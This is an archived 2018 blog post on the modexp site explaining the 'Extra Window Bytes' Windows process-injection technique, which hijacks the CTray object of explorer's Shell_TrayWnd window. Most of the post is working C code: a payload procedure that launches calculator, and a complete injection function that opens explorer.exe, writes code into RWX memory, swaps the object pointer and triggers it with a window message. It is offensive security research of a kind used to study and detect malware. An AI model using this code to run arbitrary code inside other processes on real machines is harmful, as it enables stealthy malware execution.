# https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/

Donate

[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](https://web.archive.org/web/ "Wayback Machine home page")

[30 captures](https://web.archive.org/web/20190428161440*/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/ "See a list of every capture for this URL")

28 Apr 2019 - 28 Mar 2025

|     |     |     |
| --- | --- | --- |
| Mar | APR | May |
|  | 28 |  |
| 2018 | 2019 | 2020 |

success

fail
[Share via My Web Archive](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/# "Share via My Web Archive") [Sign In](https://archive.org/account/login.php "Sign In")[Get some help using the Wayback Machine](https://help.archive.org/help/category/the-wayback-machine/ "Get some help using the Wayback Machine")[Close the toolbar](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#close "Close the toolbar")

[screenshot](https://web.archive.org/web/20190428161440/http://web.archive.org/screenshot/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/ "screenshot")[video](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/# "video")[Share on Facebook](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/# "Share on Facebook")[Share on Twitter](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/# "Share on Twitter")

[About this capture](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#expand)

COLLECTED BY

Collection: [Twitter Outlinks](https://archive.org/details/twitteroutlinks)

This is a Collection of URLs (and Outlinked URLs) extracted from a random feed of 1% of all Tweets.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/

## [Windows Process Injection: Extra Window Bytes](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/)

Posted on [August 26, 2018](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/ "11:00 am") by[odzhan](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/author/odzhan/ "View all posts by odzhan")

### Introduction

This method of injection is famous for being used in the [Powerloader](https://web.archive.org/web/20190428161440/https://github.com/BreakingMalware/PowerLoaderEx) malware that surfaced sometime around 2013. Nobody knows for sure when it was first used for process injection because the feature exploited has been part of the Windows operating system since the late 80s or early 90s. Index zero of the Extra Window Bytes can be used to associate a class object with a window. A pointer to a class object is stored at index zero using **SetWindowLongPtr** and one can be retrieved using **GetWindowLongPtr**. The first mention of using “Shell\_TrayWnd” as an injection vector can be traced to a post on the WASM forum by a user called “Indy(Clerk)”. There was some discussion about it there around 2009.

Figure 1 shows information for the “Shell\_TrayWnd” class where you can see index zero of the Window Bytes has a value set.

![](https://web.archive.org/web/20190428161440im_/https://modexp.files.wordpress.com/2018/08/shell_traywnd.png?w=640)

Figure 1 : Window Spy++ information for Shell\_TrayWnd

Windows Spy++ doesn’t show the full 64-bit value here, but is shown in figure 2, which displays the value returned by **GetWindowLongPtr** API for the same window.

![](https://web.archive.org/web/20190428161440im_/https://modexp.files.wordpress.com/2018/08/hwnd_pid.png?w=640)

Figure 2 : Full address of CTray object

### CTray class

There are only three methods in this class and no properties. The pointers to each method are read-only so we can’t simply overwrite the pointer to **WndProc** with a pointer to a payload. We can construct the object manually, but I think a better approach is to copy the existing object to local memory, overwrite **WndProc** and write the object to a new location in explorer memory. The following structure is used to define the object and pointer.

```
// CTray object for Shell_TrayWnd
typedef struct _ctray_vtable {
    ULONG_PTR vTable;    // change to remote memory address
    ULONG_PTR AddRef;
    ULONG_PTR Release;
    ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;
```

The above structure contains everything necessary to replace the CTray object on both 32 and 64-bit systems. The size of ULONG\_PTR is 4-bytes on 32-bit systems and 8-bytes on 64-bit.

### Payload

The main difference between this and the code used for PROPagate is the function prototype. If we didn’t release the same number of parameters when returning to the caller, we run the risk of crashing Windows explorer or whatever window that has a class associated with it.

```
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg,
  WPARAM wParam, LPARAM lParam)
{
    // ignore messages other than WM_CLOSE
    if (uMsg != WM_CLOSE) return 0;

    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szCalc[2];

    // WinExec
    szWinExec[0]=0x456E6957;
    szWinExec[1]=0x00636578;

    // calc
    szCalc[0] = 0x636C6163;
    szCalc[1] = 0;

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szCalc, SW_SHOW);
    }
    return 0;
}
```

### Full function

So here’s the function to perform the injection when provided a Position Independent Code (PIC). As with all these examples, I omit error checking to help visualize the process in steps.

```
LPVOID ewm(LPVOID payload, DWORD payloadSize){
    LPVOID    cs, ds;
    CTray     ct;
    ULONG_PTR ctp;
    HWND      hw;
    HANDLE    hp;
    DWORD     pid;
    SIZE_T    wr;

    // 1. Obtain a handle for the shell tray window
    hw = FindWindow("Shell_TrayWnd", NULL);

    // 2. Obtain a process id for explorer.exe
    GetWindowThreadProcessId(hw, &pid);

    // 3. Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 4. Obtain pointer to the current CTray object
    ctp = GetWindowLongPtr(hw, 0);

    // 5. Read address of the current CTray object
    ReadProcessMemory(hp, (LPVOID)ctp,
        (LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);

    // 6. Read three addresses from the virtual table
    ReadProcessMemory(hp, (LPVOID)ct.vTable,
      (LPVOID)&ct.AddRef, sizeof(ULONG_PTR) * 3, &wr);

    // 7. Allocate RWX memory for code
    cs = VirtualAllocEx(hp, NULL, payloadSize,
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 8. Copy the code to target process
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    // 9. Allocate RW memory for the new CTray object
    ds = VirtualAllocEx(hp, NULL, sizeof(ct),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 10. Write the new CTray object to remote memory
    ct.vTable  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    ct.WndProc = (ULONG_PTR)cs;

    WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr);

    // 11. Set the new pointer to CTray object
    SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);

    // 12. Trigger the payload via a windows message
    PostMessage(hw, WM_CLOSE, 0, 0);

    // 13. Restore the original CTray object
    SetWindowLongPtr(hw, 0, ctp);

    // 14. Release memory and close handles
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hp);
}
```

### Summary

Injection methods like this against window objects usually fall under the category of “Shatter” attacks. Despite the mitigations provided by User Interface Privilege Isolation (UIPI) introduced with the release of Windows Vista, this method of injection continues to work fine on the latest build of Windows 10. You can view [source code here](https://web.archive.org/web/20190428161440/https://github.com/odzhan/injection/tree/master/extrabytes) with a payload that executes calculator.

### Share this:

- [Twitter](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/?share=twitter "Click to share on Twitter")
- [Facebook](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/?share=facebook "Click to share on Facebook")

### Like this:

LikeLoading...

### _Related_

This entry was posted in [injection](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/category/injection/), [malware](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/category/malware/), [programming](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/category/programming/), [windows](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/category/windows/) and tagged [extra window bytes](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/tag/extra-window-bytes/), [powerloader](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/tag/powerloader/), [process injection](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/tag/process-injection/). Bookmark the [permalink](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/ "Permalink to Windows Process Injection: Extra Window�Bytes").

### 1 Response to _Windows Process Injection: Extra Window Bytes_

1. Pingback: [Windows Process Injection: ConsoleWindowClass \| modexp](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/09/12/process-injection-user-data/)


### Leave a Reply [Cancel reply](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/\#respond)

Enter your comment here...

Fill in your details below or click an icon to log in:

- [Login via Guest](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#comment-form-guest "Login via Guest")
- [Login via WordPress.com](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#comment-form-load-service:WordPress.com "Login via WordPress.com")

- [Login via Twitter](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#comment-form-load-service:Twitter "Login via Twitter")
- [Login via Facebook](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#comment-form-load-service:Facebook "Login via Facebook")

[![Gravatar](https://web.archive.org/web/20190428161440im_/https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&d=identicon&forcedefault=y&r=G)](https://web.archive.org/web/20190428161440/https://gravatar.com/site/signup/)

Email (required)(Address never made public)

Name (required)

Website

![WordPress.com Logo](https://web.archive.org/web/20190428161440im_/https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&d=identicon&forcedefault=y&r=G)

You are commenting using your WordPress.com account.
( Log Out /
[Change](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#) )


![Google photo](https://web.archive.org/web/20190428161440im_/https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&d=identicon&forcedefault=y&r=G)

You are commenting using your Google account.
( Log Out /
[Change](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#) )


![Twitter picture](https://web.archive.org/web/20190428161440im_/https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&d=identicon&forcedefault=y&r=G)

You are commenting using your Twitter account.
( Log Out /
[Change](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#) )


![Facebook photo](https://web.archive.org/web/20190428161440im_/https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&d=identicon&forcedefault=y&r=G)

You are commenting using your Facebook account.
( Log Out /
[Change](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/#) )


Cancel

Connecting to %s

Notify me of new comments via email.

- Search for:

- ### Recent Posts


  - [Windows Process Injection: WordWarping, Hyphentension, AutoCourgette, Streamception, Oleum, ListPlanting, Treepoline](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/)
  - [Shellcode: A reverse shell for Linux in C with support for TLS/SSL](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2019/04/24/glibc-shellcode/)
  - [Windows Process Injection: Print Spooler](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2019/03/07/process-injection-print-spooler/)
  - [How the L0pht (probably) optimized attack against the LanMan hash.](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2019/02/02/3883/)
  - [A Guide to ARM64 / AArch64 Assembly on Linux with Shellcodes and Cryptography](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/10/30/arm64-assembly/)
  - [Windows Process Injection: ConsoleWindowClass](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/09/12/process-injection-user-data/)
  - [Windows Process Injection: Service Control Handler](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/30/windows-process-injection-control-handler/)
  - [Windows Process Injection: Extra Window Bytes](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/26/process-injection-ctray/)
  - [Windows Process Injection: PROPagate](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/23/process-injection-propagate/)
  - [Shellcode: Encrypting traffic](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/17/shellcode-encrypting-traffic/)
  - [Shellcode: Synchronous shell for Linux in ARM32 assembly](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/08/13/sync-shell-nix-arm32/)
  - [Windows Process Injection: Sharing the payload](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/07/15/process-injection-sharing-payload/)
  - [Windows Process Injection: Writing the payload](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/07/12/process-injection-writing-payload/)
  - [Shellcode: Synchronous shell for Linux in amd64 assembly](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/07/08/synch-shell-nix-amd64/)
  - [Shellcode: Synchronous shell for Linux in x86 assembly](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/06/21/sync-shell-nix/)
  - [Stopping the Event Logger via Service Control Handler](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/06/08/stop-event-logger/)
  - [Shellcode: Encryption Algorithms in ARM Assembly](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2018/02/04/arm-crypto/)
  - [Shellcode: A Tweetable Reverse Shell for x86 Windows](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/11/16/tweetable-shellcode-windows/)
  - [Polymorphic Mutex Names](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/10/30/poly-mutex-names/)
  - [Shellcode: Linux ARM (AArch64)](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/09/11/shellcode-linux-aarch64/)
  - [Shellcode: Linux ARM Thumb mode](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/09/09/shellcode-linux-arm-thumb/)
  - [Shellcode: Windows API hashing with block ciphers ( Maru Hash )](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/08/05/shellcode-maru-hash/)
  - [Using Windows Schannel for Covert Communication](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/07/10/schannel-covert/)
  - [Shellcode: x86 optimizations part 1](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/06/07/x86-trix-one/)
  - [WanaCryptor File Encryption and Decryption](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/05/15/wanacryptor/)
  - [Shellcode: Dual Mode (x86 + amd64) Linux shellcode](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/02/20/shellcode-linux-x84/)
  - [Shellcode: Fido and how it resolves GetProcAddress and LoadLibraryA](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/02/03/shellcode-iat/)
  - [Shellcode: Dual mode PIC for x86 (Reverse and Bind Shells for Windows)](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/01/24/shellcode-x84/)
  - [Shellcode: Solaris x86](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/01/23/shellcode-solaris/)
  - [Shellcode: Mac OSX amd64](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/01/21/shellcode-osx/)
  - [Shellcode: Resolving API addresses in memory](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2017/01/15/shellcode-resolving-api-addresses/)
  - [Shellcode: A Windows PIC using RSA-2048 key exchange, AES-256, SHA-3](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/12/26/windows-pic/)
  - [Shellcode: Execute command for x32/x64 Linux / Windows / BSD](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/06/04/winux/)
  - [Shellcode: Detection between Windows/Linux/BSD on x86 architecture](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/06/02/shellcode-detection/)
  - [Shellcode: FreeBSD / OpenBSD amd64](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/04/03/x64-shellcodes-bsd/)
  - [Shellcode: Linux amd64](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/)
  - [Shellcodes: Executing Windows and Linux Shellcodes](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2016/03/28/winux-shellcodes/)
  - [DLL/PIC Injection on Windows from Wow64 process](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2015/11/19/dllpic-injection-on-windows-from-wow64-process/)
  - [Asmcodes: Platform Independent PIC for Loading DLL and Executing Commands](https://web.archive.org/web/20190428161440/https://modexp.wordpress.com/2015/11/17/asmcodes-pic/)